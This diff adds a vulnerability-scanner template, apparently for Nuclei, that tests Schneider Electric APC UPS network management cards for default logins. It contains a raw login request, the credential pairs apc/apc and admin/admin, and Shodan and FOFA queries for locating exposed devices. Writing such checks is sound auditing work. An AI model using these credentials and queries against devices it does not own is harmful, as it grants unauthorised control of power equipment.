@@ -1,0 +1,58 @@
+id: apc-nmc-default-login
+
+info:
+  name: Schneider Electric APC NMC - Default Login
+  author: x-stp
+  severity: high
+  description: |
+    Schneider Electric APC Network Management Cards with default credentials.
+  reference:
+    - https://www.apc.com/us/en/faqs/FA156047/
+  classification:
+    cwe-id: CWE-522
+    cvss-score: 8.6
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L
+    cpe: cpe:2.3:o:schneider-electric:network_management_card_firmware:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 4
+    shodan-query: title:"APC | Log On"
+    fofa-query: title="APC | Log On"
+    product: apc-network-management-card
+    vendor: schneider-electric
+  tags: apc,default-login,iot,ups
+
+http:
+  - raw:
+      - |
+        POST /Forms/login1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        login_username={{username}}&login_password={{password}}&prefLanguage=00000000&submit=Log+On
+
+    attack: pitchfork
+    payloads:
+      username:
+        - apc
+        - admin
+      password:
+        - apc
+        - admin
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - "(?i)Location: .*/NMC/"
+
+      - type: regex
+        part: header
+        regex:
+          - "(?i)Set-Cookie: APC[^=]+=[^;]+"
+
+      - type: status
+        status:
+          - 303
+# digest: 4a0a004730450220368c5dd1ca533f7042d64b5f783de016c206152d7e8cefb9b4c7b23b06e5e0ae0221008d93ddf629d024aed6c19e0e27b6762366b7b4f8beb2f7f336d7d4085aece6c7:922c64590222798bb761d5b6d8e72950
